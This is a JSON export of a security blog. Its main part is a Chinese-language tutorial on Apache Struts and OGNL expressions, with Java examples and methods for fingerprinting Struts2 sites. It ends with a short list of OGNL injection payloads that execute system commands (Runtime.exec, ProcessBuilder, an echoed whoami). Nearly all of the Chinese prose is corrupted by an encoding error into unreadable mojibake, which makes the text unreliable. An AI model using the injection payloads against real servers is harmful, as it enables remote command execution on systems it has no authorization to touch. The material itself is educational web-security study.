https://blog.csdn.net/m0_71692682/article/details/126697298","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"weblogic","slug":"weblogic","permalink":"https://gryffinbit.top/tags/weblogic/"}],"author":"Gryffinbit"},{"title":"strutsä»‹ç»ä»¥åŠognlè¡¨è¾¾å¼","slug":"strutsä»‹ç»ä»¥åŠognlè¡¨è¾¾å¼","date":"2022-10-14T09:58:38.000Z","updated":"2024-11-12T06:59:12.000Z","comments":true,"path":"2022/10/14/strutsä»‹ç»ä»¥åŠognlè¡¨è¾¾å¼/","permalink":"https://gryffinbit.top/2022/10/14/struts%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8Aognl%E8%A1%A8%E8%BE%BE%E5%BC%8F/","excerpt":"","text":"strutsçš„å†å²å’Œç”¨é€”Struts æ˜¯ä¸€ä¸ªå¼€æºæ¡†æ¶ï¼Œç”¨äºæ‰©å±• Java Servlet API å¹¶ä½¿ç”¨æ¨¡å‹ã€è§†å›¾ã€æ§åˆ¶å™¨(MVC) ä½“ç³»ç»“æ„ã€‚é€šè¿‡æ­¤æ¡†æ¶ï¼Œæ‚¨å¯ä»¥åŸºäºå„ç§æ ‡å‡†æŠ€æœ¯ï¼ˆå¦‚ JSP é¡µã€JavaBeansã€èµ„æºåŒ…å’Œ XMLï¼‰åˆ›å»ºå¯ç»´æŠ¤ã€å¯æ‰©å±•å¹¶ä¸”çµæ´»çš„ Web åº”ç”¨ç¨‹åºã€‚ ä½¿ç”¨ Struts æ—¶ï¼Œæ­¤æ¡†æ¶å°†ä¸ºæ‚¨æä¾›ä¸€ä¸ªæ§åˆ¶å™¨ Servlet (ActionServlet)ï¼Œå®ƒåœ¨ IDE ä¸­åŒ…å«çš„ Struts åº“ä¸­å®šä¹‰ï¼Œå¹¶è‡ªåŠ¨åœ¨ web.xml éƒ¨ç½²æè¿°ç¬¦ä¸­æ³¨å†Œ è¯¥æ§åˆ¶å™¨ Servlet ä½¿ç”¨ struts-config.xml æ–‡ä»¶å°†ä¼ å…¥è¯·æ±‚æ˜ å°„åˆ° Struts Action å¯¹è±¡ï¼Œå¹¶å®ä¾‹åŒ–ä¸æš‚æ—¶å­˜å‚¨çª—ä½“æ•°æ®çš„æ“ä½œç›¸å…³è”çš„ä»»ä½• ActionForm å¯¹è±¡ã€‚Action å¯¹è±¡åœ¨ä½¿ç”¨çª—ä½“ Bean ä¸­å­˜å‚¨çš„ä»»ä½•æ•°æ®çš„åŒæ—¶ï¼Œä½¿ç”¨å…¶ execute æ–¹æ³•å¤„ç†è¯·æ±‚ã€‚ä¸€æ—¦ Action å¯¹è±¡å¤„ç†äº†è¯·æ±‚ï¼Œå®ƒå°±å°†å­˜å‚¨ä»»ä½•æ–°æ•°æ®ï¼ˆå³ï¼Œå­˜å‚¨åœ¨çª—ä½“ Bean æˆ–å•ç‹¬çš„ç»“æœ Bean ä¸­ï¼‰ï¼Œå¹¶å°†ç»“æœè½¬å‘åˆ°ç›¸åº”çš„è§†å›¾ä¸­ã€‚ Struts æ˜¯ Apache è½¯ä»¶åŸºé‡‘ä¼šï¼ˆApache Software Foundationï¼‰èµ„åŠ©çš„ä¸€ä¸ªä¸ºå¼€å‘åŸºäºMVCæ¨¡å¼åº”ç”¨æ¶æ„çš„å¼€æºæ¡†æ¶ï¼Œæ˜¯åˆ©ç”¨Java Servletå’ŒJSPã€XMLç­‰æ–¹é¢çš„æŠ€æœ¯æ¥å®ç°æ„å»ºWebåº”ç”¨çš„ä¸€é¡¹éå¸¸æœ‰ç”¨çš„æŠ€æœ¯ï¼Œå®ƒä¹Ÿæ˜¯åŸºäºMVCæ¨¡å¼çš„Webåº”ç”¨æœ€ç»å…¸æ¡†æ¶ã€‚ Strutsæ¡†æ¶çš„ä¸»è¦æ¶æ„è®¾è®¡å’Œå¼€å‘è€…æ˜¯Craig R.McClanahanã€‚Struts æ˜¯ç›®å‰Java Web MVCæ¡†æ¶ä¸­ä¸äº‰çš„ç‹è€…ã€‚ç»è¿‡é•¿è¾¾äº”å¹´çš„å‘å±•ï¼ŒStrutså·²ç»é€æ¸æˆé•¿ä¸ºä¸€ä¸ªç¨³å®šã€æˆç†Ÿçš„æ¡†æ¶ï¼Œå¹¶ä¸”å æœ‰äº†MVCæ¡†æ¶ä¸­æœ€å¤§çš„å¸‚åœºä»½é¢ã€‚ StrutsæŠŠServletã€JSPã€è‡ªå®šä¹‰æ ‡ç­¾å’Œä¿¡æ¯èµ„æº(message resources)æ•´åˆåˆ°ä¸€ä¸ªç»Ÿä¸€çš„æ¡†æ¶ä¸­ï¼Œä¸»è¦ç”±ä¸€ç³»åˆ—çš„æ¡†æ¶ç±»ã€è¾…åŠ©ç±»å’Œå®šåˆ¶çš„JSPæ ‡è®°åº“æ„æˆã€‚å¼€å‘äººå‘˜åˆ©ç”¨å…¶è¿›è¡Œå¼€å‘æ—¶ä¸ç”¨å†è‡ªå·±ç¼–ç å®ç°å…¨å¥—MVCæ¨¡å¼ï¼Œæå¤§çš„èŠ‚çœäº†æ—¶é—´ã€‚ ognlè¡¨è¾¾å¼OGNLæ˜¯Object-Graph Navigation Languageçš„ç¼©å†™ï¼Œå®ƒæ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œé€šè¿‡å®ƒç®€å•ä¸€è‡´çš„è¡¨è¾¾å¼è¯­æ³•ï¼Œå¯ä»¥å­˜å–å¯¹è±¡çš„ä»»æ„å±æ€§ï¼Œè°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ï¼Œéå†æ•´ä¸ªå¯¹è±¡çš„ç»“æ„å›¾ï¼Œå®ç°å­—æ®µç±»å‹è½¬åŒ–ç­‰åŠŸèƒ½ã€‚å®ƒä½¿ç”¨ç›¸åŒçš„è¡¨è¾¾å¼å»å­˜å–å¯¹è±¡çš„å±æ€§ã€‚åŠŸèƒ½ï¼šè·å–å’Œè®¾ç½®javaå¯¹è±¡çš„å±æ€§ã€åˆ—è¡¨æ˜ å°„å’Œé€‰æ‹©ç­‰ã€‚ å¯¹äºå¼€å‘è€…æ¥è¯´ï¼Œä½¿ç”¨ OGNLï¼Œå¯ä»¥ç”¨ç®€æ´çš„è¯­æ³•æ¥å®Œæˆå¯¹ java å¯¹è±¡çš„å¯¼èˆªã€‚é€šå¸¸æ¥è¯´ï¼šé€šè¿‡ä¸€ä¸ª â€œè·¯å¾„â€ æ¥å®Œæˆå¯¹è±¡ä¿¡æ¯çš„å¯¼èˆªï¼Œè¿™ä¸ª â€œè·¯å¾„â€ å¯ä»¥æ˜¯åˆ° java bean çš„æŸä¸ªå±æ€§ï¼Œæˆ–è€…é›†åˆä¸­çš„æŸä¸ªç´¢å¼•çš„å¯¹è±¡ï¼Œç­‰ç­‰ï¼Œè€Œä¸æ˜¯ç›´æ¥ä½¿ç”¨ get æˆ–è€… set æ–¹æ³•æ¥å®Œæˆã€‚ OGNL ä¸‰è¦ç´ è¡¨è¾¾å¼ é€šè¿‡è¡¨è¾¾å¼å‘Šè¯‰ognlåšä»€ä¹ˆã€‚è¡¨è¾¾å¼æ˜¯å¸¦æœ‰è¯­æ³•å«ä¹‰çš„å­—ç¬¦ä¸²ã€‚è¡¨è¾¾å¼æ”¯æŒï¼šé“¾å¼è®¿é—®å¯¹è±¡ã€è¡¨è¾¾å¼è®¡ç®—ã€Lambdaè¡¨è¾¾å¼ Rootå¯¹è±¡ OGNLçš„æ“ä½œå¯¹è±¡ã€‚ ä¸Šä¸‹æ–‡ç¯å¢ƒ æ‰€æœ‰æ“ä½œéœ€è¦åœ¨ä¸€ä¸ªç‰¹å®šçš„æ•°æ®ç¯å¢ƒä¸­è¿è¡Œã€‚æ¯”å¦‚å¯¹rootå¯¹è±¡èµ‹å€¼ã€å–å€¼ OGNLçš„ä½¿ç”¨ Mavenï¼šé¡¹ç›®ç®¡ç†å·¥å…·ã€‚é€šè¿‡pom.xmlæ–‡ä»¶çš„é…ç½®è·å–jaråŒ…ï¼Œä¸ç”¨æ‰‹åŠ¨çš„å»æ·»åŠ jaråŒ…ã€‚mavené¡¹ç›®æ˜¯åœ¨javaé¡¹ç›®å’Œwebé¡¹ç›®ä¸Šè£¹äº†ä¸€å±‚mavenã€‚mavençš„åŠŸèƒ½ã€‚ æ„å»ºå·¥ç¨‹ï¼Œ ç®¡ç†jarï¼Œç¼–è¯‘ä»£ç ï¼Œè‡ªåŠ¨è¿è¡Œå•å…ƒæµ‹è¯•ï¼Œ æ‰“åŒ… ï¼Œç”ŸæˆæŠ¥è¡¨ï¼Œéƒ¨ç½²é¡¹ç›®ï¼Œç”Ÿæˆwebç«™ç‚¹ã€‚ å¼•å…¥Maven 12345&lt;dependency&gt; &lt;groupId&gt;ognl&lt;/groupId&gt; &lt;artifactId&gt;ognl&lt;/artifactId&gt; &lt;version&gt;3.1.19&lt;/version&gt;&lt;/dependency&gt; ç¤ºä¾‹ç±» sample.ognl.Address 1234567891011@Datapublic class Address &#123; private String port; private String address; public Address(String port,String address) &#123; this.port = port; this.address = address; &#125;&#125; OGNLåŸºæœ¬è¯­æ³•å¯¹rootå¯¹è±¡çš„è®¿é—® ä½¿ç”¨çš„æ˜¯é“¾å¼é£æ ¼ 1234567User user = new User(&quot;test&quot;, 23);Address address = new Address(&quot;330108&quot;, &quot;æ­å·å¸‚æ»¨æ±ŸåŒº&quot;);user.setAddress(address);System.out.println(Ognl.getValue(&quot;name&quot;, user)); // testSystem.out.println(Ognl.getValue(&quot;name.length&quot;, user)); // 4System.out.println(Ognl.getValue(&quot;address&quot;, user)); // Address(port=330108, address=æ­å·å¸‚æ»¨æ±ŸåŒº)System.out.println(Ognl.getValue(&quot;address.port&quot;, user)); // 110003 è®¿é—®contextä¸­çš„å‚æ•° å½“è®¿é—®ä¸Šä¸‹æ–‡ç¯å¢ƒå½“ä¸­çš„å‚æ•°æ—¶å€™ï¼Œéœ€è¦åœ¨è¡¨è¾¾å¼å‰é¢åŠ ä¸Š â€˜#â€™ ï¼Œè¡¨ç¤ºäº†ä¸è®¿é—® Root å¯¹è±¡çš„åŒºåˆ«ã€‚ 123456789101112public static String demo2() throws OgnlException &#123; User user = new User(&quot;test&quot;, 23); Address address = new Address(&quot;330108&quot;, &quot;æ­å·å¸‚æ»¨æ±ŸåŒº&quot;); user.setAddress(address); Map&lt;String, Object&gt; context = new HashMap&lt;String, Object&gt;(); context.put(&quot;init&quot;, &quot;hello&quot;); context.put(&quot;user&quot;, user); System.out.println(Ognl.getValue(&quot;#init&quot;, context, user)); // hello System.out.println(Ognl.getValue(&quot;#user.name&quot;, context, user)); // test System.out.println(Ognl.getValue(&quot;name&quot;, context, user)); // test return &quot;this is demo2 method&quot;;&#125; è®¿é—®é™æ€å˜é‡ æ ¼å¼@[class]@[field/method()] 12345678public static String ONE = &quot;one&quot;;// å¯¹é™æ€å˜é‡çš„è®¿é—®ï¼ˆ@[class]@[field/method()]ï¼‰public static void demo3() throws OgnlException &#123; Object object1 = Ognl.getValue(&quot;@sample.ognl.OgnlDemo@ONE&quot;, null); Object object2 = Ognl.getValue(&quot;@sample.ognl.OgnlDemo@demo2()&quot;, null); // helloã€testã€test System.out.println(object1); // one System.out.println(object2); // this is demo2 method&#125; æ–¹æ³•çš„è°ƒç”¨ è°ƒç”¨rootå¯¹è±¡æˆ–contextå¯¹è±¡å½“ä¸­çš„æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨.+æ–¹æ³•çš„æ–¹å¼æ¥è°ƒç”¨ã€‚è¿˜å¯ä»¥ä¼ å…¥å‚æ•°ã€‚ èµ‹å€¼çš„æ—¶å€™ï¼Œå¯ä»¥é€‰æ‹©contextå½“ä¸­çš„å…ƒç´ ç»™rootå¯¹è±¡çš„nameå±æ€§èµ‹å€¼ã€‚ 1234567User user = new User();Map&lt;String, Object&gt; context = new HashMap&lt;String, Object&gt;();context.put(&quot;name&quot;, &quot;rcx&quot;);context.put(&quot;password&quot;, &quot;password&quot;);System.out.println(Ognl.getValue(&quot;getName()&quot;, context, user)); // nullOgnl.getValue(&quot;setName(#name)&quot;, context, user);System.out.println(Ognl.getValue(&quot;getName()&quot;, context, user)); // rcx å¯¹æ•°ç»„å’Œé›†åˆçš„è®¿é—® å¯¹æ•°ç»„æŒ‰ç…§æ•°ç»„ä¸‹æ ‡çš„é¡ºåºè¿›è¡Œè®¿é—®ã€‚åŒæ ·é€‚ç”¨äºé›†åˆçš„è®¿é—®ï¼Œå¯¹äºMapæ”¯æŒç”¨é”®è¿›è¡Œè®¿é—® 1234567891011121314151617User user = new User();Map&lt;String, Object&gt; context = new HashMap&lt;String, Object&gt;();String[] strings = &#123;&quot;aa&quot;, &quot;bb&quot;&#125;;ArrayList&lt;String&gt; list = new ArrayList&lt;String&gt;();list.add(&quot;aa&quot;);list.add(&quot;bb&quot;);Map&lt;String, String&gt; map = new HashMap&lt;String, String&gt;();map.put(&quot;key1&quot;, &quot;value1&quot;);map.put(&quot;key2&quot;, &quot;value2&quot;);context.put(&quot;list&quot;, list);context.put(&quot;strings&quot;, strings);context.put(&quot;map&quot;, map);System.out.println(Ognl.getValue(&quot;#strings[0]&quot;, context, user)); // aaSystem.out.println(Ognl.getValue(&quot;#list[0]&quot;, context, user)); // aaSystem.out.println(Ognl.getValue(&quot;#list[0 + 1]&quot;, context, user)); // bbSystem.out.println(Ognl.getValue(&quot;#map[&#x27;key1&#x27;]&quot;, context, user)); // value1System.out.println(Ognl.getValue(&quot;#map[&#x27;key&#x27; + &#x27;2&#x27;]&quot;, context, user)); // value2 ognlè¡¨è¾¾å¼å½“ä¸­æ”¯æŒæ“ä½œç¬¦çš„ç®€å•è¿ç®—.æ¯”å¦‚ï¼šğŸ‘‡ 123452 + 4 // æ•´æ•°ç›¸åŠ ï¼ˆåŒæ—¶ä¹Ÿæ”¯æŒå‡æ³•ã€ä¹˜æ³•ã€é™¤æ³•ã€å–ä½™ [% /mod]ã€ï¼‰&quot;hell&quot; + &quot;lo&quot; // å­—ç¬¦ä¸²ç›¸åŠ i++ // é€’å¢ã€é€’å‡i == j // åˆ¤æ–­var in list // æ˜¯å¦åœ¨å®¹å™¨å½“ä¸­ æŠ•å½±ä¸é€‰æ‹© æ”¯æŒç±»ä¼¼æ•°æ®åº“å½“ä¸­çš„é€‰æ‹©ä¸æŠ•å½±åŠŸèƒ½ åˆ›å»ºå¯¹è±¡ åˆ›å»ºListå¯¹è±¡ã€‚&#123;&#125;ï¼Œç”¨,è¿›è¡Œåˆ†å‰²ã€‚&#123;&quot;aa&quot;,&quot;bb&quot;,&quot;cc&quot;&#125; åˆ›å»ºMapå¯¹è±¡ã€‚ä½¿ç”¨#&#123;&#125;ï¼Œç”¨,è¿›è¡Œåˆ†å‰²é”®å€¼å¯¹ã€‚#&#123;&quot;key1&quot; : &quot;value1&quot;, &quot;key2&quot; : &quot;value2&quot;&#125; æ„é€ ä»»æ„å¯¹è±¡ï¼šç›´æ¥ä½¿ç”¨å·²çŸ¥çš„å¯¹è±¡çš„æ„é€ æ–¹æ³•è¿›è¡Œæ„é€  1234System.out.println(Ognl.getValue(&quot;#&#123;&#x27;key1&#x27;:&#x27;value1&#x27;&#125;&quot;, null)); // &#123;key1=value1&#125;System.out.println(Ognl.getValue(&quot;&#123;&#x27;key1&#x27;,&#x27;value1&#x27;&#125;&quot;, null)); // [key1, value1]System.out.println(Ognl.getValue(&quot;new sample.ognl.User()&quot;, null)); // User(name=null, age=0, address=null) å¦‚ä½•å¿«é€Ÿåˆ¤æ–­ç½‘ç«™æ˜¯å¦ä½¿ç”¨strutsURLä¸­æ·»åŠ ä¸å­˜åœ¨è·¯å¾„åœ¨URLçš„åæ–œæ éƒ¨åˆ†æ·»åŠ ç½‘ç«™ä¸å­˜åœ¨çš„è·¯å¾„ï¼Œæœ€å¥½æ˜¯éšæœºå­—ç¬¦ä¸²ç»„æˆçš„è¾ƒé•¿è·¯å¾„ï¼Œå¦‚æœè¿”å›åŒæ ·çš„é¡µé¢ï¼Œåˆ™å¤§æ¦‚ç‡æ˜¯Struts2æ¡†æ¶ã€‚ å¦‚æœè¿”å›çš„æ˜¯404æˆ–è€…æ˜¯æŠ¥é”™ï¼Œåˆ™å¤§æ¦‚ç‡æ˜¯springæ¡†æ¶ å®éªŒæ­¥éª¤ åœ¨æœ€åå³è¾¹åæ–œæ å¤„æ·»åŠ ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„ &#x2F;xxxxxxxxxx&#x2F;ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š http://127.0.0.1:9999/S2_016_war/barspace/xxxxxxxxx/login.do è¿”å›ä¸åŸ URL ç›¸åŒé¡µé¢ï¼Œåˆ™æ˜¯ Struts2 æ¡†æ¶ http://127.0.0.1:9999/S2_016_war/barspace/xxxxxxxxx/login.do è¿”å›ä¸åŸ URL å¼‚åŒé¡µé¢ï¼Œåˆ™æ˜¯ Spring æ¡†æ¶ å¦‚æœä¸¤ä¸ª URL å‡æŠ¥é”™ã€æˆ–è€…å‡æ­£å¸¸ï¼Œæ— æ³•åŒºåˆ†ï¼Œé‚£ä¹ˆç»§ç»­åœ¨å‰ä¸€ä¸ªåæ–œæ å¤„æ·»åŠ ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„ http://127.0.0.1:9999/S2_016_war/xxxxxxxxx/barspace/login.do åŸç†1 Struts2 ç«™ç‚¹çš„ URL è·¯å¾„åŒ…æ‹¬å››éƒ¨åˆ†ç»„æˆï¼šå·¥ç¨‹å + namespace å‘½åç©ºé—´ + action å + Struts2 æ‰©å±•åï¼Œä¸¾ä¸ªä¾‹å­ï¼Œå¯¹äºå¦‚ä¸‹ URLï¼š http://127.0.0.1:9999/S2_016_war/barspace/login.action /S2-016-war / éƒ¨åˆ†æ˜¯ war åŒ…éƒ¨ç½²çš„å·¥ç¨‹åï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯é¡¹ç›®åã€ä¸Šä¸‹æ–‡ç­‰ç­‰ï¼Œè¯´æ³•ä¸ä¸€ã€‚ /barspace/ éƒ¨åˆ†æ˜¯ Struts2 çš„å‘½åç©ºé—´ namespaceã€‚ /login éƒ¨åˆ†æ˜¯ Struts2 çš„ action åï¼ŒæŒ‡å‘å…·ä½“å¤„ç†è¯·æ±‚çš„ Java ç±»ã€‚ .action éƒ¨åˆ†æ˜¯ Struts2 çš„æ‰©å±•åï¼Œä¹Ÿå¯ä»¥å®šä¹‰ä¸º.doã€.dw ç­‰ç­‰ã€‚ åŸç†2 æŒ‰ç…§struts2æ¡†æ¶è§„åˆ™ï¼Œé¦–å…ˆä¼šåœ¨å½“å‰è·¯å¾„ä¸‹æ‰¾actionåloginï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°å»ä¸Šä¸€å±‚æ‰¾ã€‚ä¼šä¸€ç›´å‘ä¸Šä¸€å±‚æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°åº”ç”¨ç¨‹åºçš„è·Ÿè·¯å¾„ä¸ºæ­¢æˆ–æ‰¾åˆ°åº”ç”¨ç¨‹åºä¸ºæ­¢ã€‚ ä½†å‰ç«¯å¦‚æœæœ‰nginxï¼Œåˆ™è¿™ç§æ–¹æ³•æ— æ•ˆï¼Œå› ä¸ºnginxå¯èƒ½ä¼šé…ç½®ä¸€äº›ç‰¹æ®Šçš„URLè½¬å‘ã€‚ URLæ·»åŠ &#x2F;struts&#x2F;domTT.cssåœ¨ URL çš„ Web åº”ç”¨æ ¹ç›®å½•ä¸‹æ·»åŠ  /struts/domTT.cssï¼Œå¦‚æœè¿”å› css ä»£ç ï¼Œé‚£ä¹ˆ 99% æ˜¯ Struts2ã€‚ å› ä¸ºdo m TT.cssæ–‡ä»¶åœ¨ç½‘ç«™æºç æ–‡ä»¶ä¸­æ˜¯æ‰¾ä¸åˆ°çš„ï¼Œç”¨ç£ç›˜æœç´¢çš„æ–¹å¼æœç´¢ä¸åˆ°ï¼Œå› ä¸ºè¿™ä¸ªæ–‡ä»¶åœ¨struts2çš„jaråŒ…ä¸­ã€‚ 404ã€500å“åº”ç è¿”å›ä¿¡æ¯è¾“å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„ï¼Œè¿”å›404é¡µé¢ï¼Œæˆ–è€…ä¼ å…¥ä¸€äº›ä¹±ç å­—ç¬¦ï¼Œé€ æˆå½“å‰é¡µé¢500å“åº”ç æŠ¥é”™ï¼ŒæŠ›å‡ºå¼‚å¸¸ä¿¡æ¯ã€‚ Struts2 å¸¸ç”¨çš„å…³é”®å­—æœ‰ï¼š no action mappedã€struts2ã€namespaceã€defined for action ç­‰ springæŠ¥é”™ï¼šå«æœ‰whitelabel Error Page çœ‹ç½‘ç«™å›¾æ ‡favicon.icoStruts2æ²¡æœ‰å¸¸ç”¨çš„favicon.icoå›¾æ ‡ Springçš„æ˜¯ä¸€ç‰‡ç»¿å¶ strutsï¼Œognlæ¼æ´åˆ©ç”¨æ¶æ„æ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹å®šæ•°æ®å¸¦å…¥ognlè¡¨è¾¾å¼å¯èƒ½è¢«è§£æå¹¶æ‰§è¡Œï¼Œè€Œognlå¯ä»¥ç”¨æ¥è·å–å’Œè®¾ç½®javaå¯¹è±¡çš„å±æ€§ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥å¯¹æœåŠ¡ç«¯å¯¹è±¡è¿›è¡Œä¿®æ”¹ï¼Œæ‰€ä»¥åªè¦ç»•è¿‡Struts2çš„ä¸€äº›å®‰å…¨ç­–ç•¥ï¼Œæ¶æ„æ”»å‡»è€…ç”šè‡³å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤è¿›è¡Œç³»ç»Ÿæ”»å‡»ã€‚ è™½ç„¶Struts2å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œåœ¨SecurityMemberAccessç±»ä¸­é€šè¿‡è®¾ç½®ç¦æ­¢é™æ€æ–¹æ³•è®¿é—®åŠé»˜è®¤ç¦æ­¢æ‰§è¡Œé™æ€æ–¹æ³•æ¥é˜»æ­¢ä»£ç æ‰§è¡Œã€‚å³ä¸Šé¢æåŠçš„denyMethodExecutionä¸ºtrueï¼ŒMemberAccessä¸ºfalseã€‚ä½†è¿™ä¸¤ä¸ªå±æ€§éƒ½å¯ä»¥è¢«ä¿®æ”¹ä»è€Œç»•è¿‡å®‰å…¨é™åˆ¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ ognlè¡¨è¾¾å¼æ³¨å…¥ç¬¦å·çš„åŒºåˆ«#ç¬¦ä¸»è¦æœ‰ä¸‰ç§ç”¨é€”ï¼š è®¿é—®éæ ¹å¯¹è±¡å±æ€§ï¼Œå³è®¿é—®OGNLä¸Šä¸‹æ–‡å’ŒActionä¸Šä¸‹æ–‡ï¼Œç”±äºStruts2ä¸­å€¼æ ˆè¢«è§†ä¸ºæ ¹å¯¹è±¡ï¼Œæ‰€ä»¥è®¿é—®å…¶ä»–éæ ¹å¯¹è±¡æ—¶éœ€è¦åŠ #å‰ç¼€ï¼Œ#ç›¸å½“äºActionContext.getContext()ï¼› ç”¨äºè¿‡æ»¤å’ŒæŠ•å½±ï¼ˆprojectingï¼‰é›†åˆï¼Œå¦‚books.&#123;? #this.price&lt;100&#125;ï¼› ç”¨äºæ„é€ Mapï¼Œå¦‚#&#123;&#39;foo1&#39;:&#39;bar1&#39;, &#39;foo2&#39;:&#39;bar2&#39;&#125;ï¼› %ç¬¦ %ç¬¦çš„ç”¨é€”æ˜¯åœ¨æ ‡å¿—çš„å±æ€§ä¸ºå­—ç¬¦ä¸²ç±»å‹æ—¶ï¼Œå‘Šè¯‰æ‰§è¡Œç¯å¢ƒ%{}é‡Œçš„æ˜¯OGNLè¡¨è¾¾å¼å¹¶è®¡ç®—è¡¨è¾¾å¼çš„å€¼ã€‚ $ç¬¦ $ç¬¦çš„ä¸»è¦ä½œç”¨æ˜¯åœ¨ç›¸å…³é…ç½®æ–‡ä»¶ä¸­å¼•å…¥OGNLè¡¨è¾¾å¼ï¼Œè®©å…¶åœ¨é…ç½®æ–‡ä»¶ä¸­ä¹Ÿèƒ½è§£æOGNLè¡¨è¾¾å¼ã€‚ï¼ˆæ¢å¥è¯è¯´ï¼Œ$ç”¨äºåœ¨é…ç½®æ–‡ä»¶ä¸­è·å–ValueStackçš„å€¼ç”¨çš„ï¼‰ã€‚ å¸¸è§payloadè·å–contexté‡Œé¢çš„å˜é‡å€¼ 12#user#user.name ä½¿ç”¨runtimeæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ 1@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;) ä½¿ç”¨processbuilderæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ 1(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;calc&quot;&#125;)).start() è·å–å½“å‰ç»å¯¹è·¯å¾„ 1@java.lang.System@getProperty(&quot;user.dir&quot;) e-moboleå¸¦å›æ˜¾ 1@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;whoami&#x27;).getInputStream()) å‚è€ƒæ–‡ç« https://netbeans.apache.org/kb/docs/web/quickstart-webapps-struts_zh_CN.html https://jueee.github.io/2020/08/2020-08-15-Ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/ https://cryin.github.io/blog/struts2-vulnerability-analysis-and-OGNL-research/ https://www.wangan.com/p/7fy7f42bcd36404c","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"struts","slug":"struts","permalink":"https://gryffinbit.top/tags/struts/"},{"name":"ognl","slug":"ognl","permalink":"https://gryffinbit.top/tags/ognl/"}],"author":"Gryffinbit"},{"title":"è§„åˆ™æ–‡æ¡£è‡ªåŠ¨åŒ–ç¼–å†™","slug":"è§„åˆ™æ–‡æ¡£è‡ªåŠ¨åŒ–ç¼–å†™","date":"2022-10-10T11:15:31.000Z","updated":"2024-08-27T02:28:10.000Z","comments":true,"path":"2022/10/10/è§„åˆ™æ–‡æ¡£è‡ªåŠ¨åŒ–ç¼–å†™/","permalink":"https://gryffinbit.top/2022/10/10/%E8%A7%84%E5%88%99%E6%96%87%E6%A1%A3%E8%87%AA%E5%8A%A8%E5%8C%96%E7%BC%96%E5%86%99/","excerpt":"","text":"å¼€å‘æ€è·¯åˆ†ç±»åˆ†æˆä¸åŒçš„ç±»åˆ«ã€‚å·¥æ§ã€æœ¨é©¬ã€æ¼æ´ã€‚æ¯ä¸ªç±»åˆ«ä¸‹é¢ï¼Œé…å¥—ç›¸åº”çš„æ¨¡æ¿ã€‚ txtæ–‡æ¡£æœ‰å›ºå®šçš„æ¨¡æ¿ï¼Œå’Œæ–‡å­—å†…å®¹ã€‚éœ€è¦æ›¿æ¢ä¸€äº›ç‰¹å®šçš„éƒ¨åˆ†ï¼Œæ¯”å¦‚sidï¼Œæ¯”å¦‚cveï¼Œæ¯”å¦‚msgã€‚å°†è¿™äº›éœ€è¦æ›¿æ¢çš„éƒ¨åˆ†ï¼Œå†™å…¥å˜é‡ï¼Œpythonè¿è¡Œçš„æ—¶å€™ï¼Œå¯ä»¥åœ¨ç»ˆç«¯è¾“å…¥è¦å¡«å…¥çš„å˜é‡éƒ¨åˆ†ã€‚ç„¶åå†™å›txtã€‚æ‰‹åŠ¨å†™å›éƒ¨åˆ†ï¼Œå¯ä»¥é€‚ç”¨äºé‚£äº›éœ€è¦æŸ¥èµ„æ–™æ‰èƒ½å†™å‡ºæ¥çš„ä¸œè¥¿ã€‚ rulespythonä¹Ÿéœ€è¦ä¸€ä¸ªè‡ªåŠ¨åŒ–å¡«å†™çš„éƒ¨åˆ†ï¼Œä¾ç„¶æ˜¯åœ¨txté‡Œé¢è®¾ç½®å˜é‡ã€‚ä½†æ˜¯pythonä¹Ÿéœ€è¦è¯»å–ruleæ–‡ä»¶ï¼Œå°†msgã€sidã€cveè‡ªåŠ¨åŒ¹é…è¯»å–å‡ºæ¥ï¼Œå¡«å…¥txtçš„ç›¸åº”å˜é‡ä¸­ã€‚è¿™äº›è¿‡ç¨‹è‡ªåŠ¨å®ç°ï¼Œè¯»å–ruleï¼Œå†™å…¥txtã€‚ æœ€ç»ˆæ€è·¯æ‰‹åŠ¨å†™å›åŠŸèƒ½ é€‚ç”¨äºé‚£äº›éœ€è¦æŸ¥èµ„æ–™çš„éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†çš„pyï¼Œæœ€å¼€å§‹éœ€è¦ä¸€ä¸ªè¾“å‡ºï¼Œè¯»å–ruleæ–‡ä»¶ï¼Œå°†msgã€cveæ‰“å°å‡ºæ¥ã€‚ éœ€è¦è¾“å…¥ï¼ŒæŒ‰é¡ºåºæ¥æç¤ºç›¸åº”çš„txtå˜é‡éƒ¨åˆ†ã€‚æŸ¥èµ„æ–™åï¼Œæ‰‹åŠ¨å°†è¿™éƒ¨åˆ†å†…å®¹è¾“å…¥ã€‚éœ€è¦æ‰‹åŠ¨è¾“å…¥çš„å†…å®¹æœ‰ï¼šmsgçš„ç¿»è¯‘ï¼Œæ¼æ´å¯¼è‡´çš„ç»“æœã€CVEå†…å®¹ã€é€ æˆçš„å½±å“ï¼ˆå’Œmsgç¿»è¯‘å†…å®¹ä¸€æ 